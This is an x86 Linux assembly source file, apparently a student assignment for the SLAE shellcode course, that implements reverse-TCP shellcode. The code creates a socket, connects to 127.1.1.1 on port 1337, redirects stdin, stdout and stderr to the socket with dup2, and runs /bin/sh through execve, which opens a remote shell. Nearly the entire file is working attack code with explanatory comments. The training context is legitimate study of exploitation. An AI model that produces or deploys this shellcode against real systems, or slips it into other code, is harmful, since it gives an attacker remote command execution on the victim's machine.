; Author: Bas Lubbers
; Assignment_02 - Shell_Reverse_TCP shellcode
; Student ID: SLAE-1456

global _start			

section .text
_start:

	; create socket - socketcall(0x1, [AF_INET, SOCK_STREAM, 0x0])
	xor ebx, ebx ; clean ebx
	push ebx ; push 0x0 as argument for protocol, default
	inc ebx ; sys_socket = 0x1
	push ebx ; push 0x1 as argument for type, SOCK_STREAM
	push byte 0x2 ; push 0x2 as argument for domain, AF_INET
	mov ecx, esp ; move stackpointer into ecx, now ecx points to the arguments 1: domain (0x2 = AF_INET) , 2: type (0x1 = SOCK_STREAM), 3: protocol (0x0 = default)
	xor eax, eax ; clean eax
	mov al, 102 ; syscall 102 = socketcall
	int 0x80 ; perform syscall

	mov esi, eax ; move the created socket fd to esi

	; create the struct - [sin_family, sin_port, sin_addr]
	push dword 0x0101017f ; sin_addr - localhost = 127.1.1.1 in little endian
	push word 0x3905 ; sin_port - port number (1337) in little endian 
	push word 0x2 ; sin_family - AF_INET = 0x2
	mov ecx, esp ; make ecx point to the struct

	; connect - socketcall(0x3, [sock_fd, struct_sockaddr, addr_len])
	push 0x10 ; address length (16)
	push ecx ; points to the struct
	push esi ; points to the socket fd, created in the first step
	mov ecx, esp ; move stackpointer to ecx, now ecx points to the arguments 1: socket_fd, 2: struct, 3: addr_len
	add ebx, 0x2 ; sys_connect = 0x3
	mov al, 102 ; syscall 102 = socketcall
	int 0x80 ; perform syscall

	xchg ebx, esi ; put the socket_fd in ebx, dup2 expects the old_fd in ebx
	xor ecx, ecx ; clean ecx
	mov cl, 0x2 ; prepare ecx for new_fd (0x2)

loop_dup2:
	; dup2(old_fd, new_fd)
	mov al, 63 ; syscall 63 = dup2
	int 0x80 ; perform syscall
	dec ecx ; 0x2 = stderr, 0x1 = stdout, 0x0 = stdin
	jns loop_dup2 ; loop until negative (SF set)

	; execve("/bin/sh",NULL,NULL)
	xor eax, eax ; clean eax
	push eax ; push 0x0 to terminate the string
	push 0x68732f2f ; "hs//"
	push 0x6e69622f ; "nib/"
	mov ebx, esp ; ebx now points to "/bin//sh\x00"

	push eax ; push 0x0
	mov ecx, esp ; put 0x0 into ecx
 
	push eax ; push 0x0
	mov edx, esp ; put 0x0 into edx

	mov al, 11 ; syscall 11 = execve
	int 0x80 ; perform syscall
	
